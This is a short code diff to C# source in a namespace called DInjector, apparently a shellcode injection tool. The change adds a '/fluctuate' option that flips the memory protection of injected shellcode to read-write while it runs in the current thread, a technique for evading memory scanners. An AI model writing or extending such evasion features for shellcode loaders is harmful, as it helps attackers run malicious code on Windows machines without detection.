@@ -217,11 +217,26 @@ namespace DInjector
                         catch (Exception)
                         { }
 
+                        string strFluctuate = "-1";
+                        try
+                        {
+                            strFluctuate = options["/fluctuate"].ToUpper();
+                        }
+                        catch (Exception)
+                        { }
+
+                        uint fluctuate = 0;
+                        if (strFluctuate == "RW")
+                            fluctuate = DI.Data.Win32.WinNT.PAGE_READWRITE;
+                        //else if (strFluctuate == "NA")
+                        //fluctuate = DI.Data.Win32.WinNT.PAGE_NOACCESS;
+
                         CurrentThread.Execute(
                             shellcodeBytes,
                             protect,
                             timeout,
-                            flipSleep);
+                            flipSleep,
+                            fluctuate);
                         break;
 
                     case "currentthreaduuid":
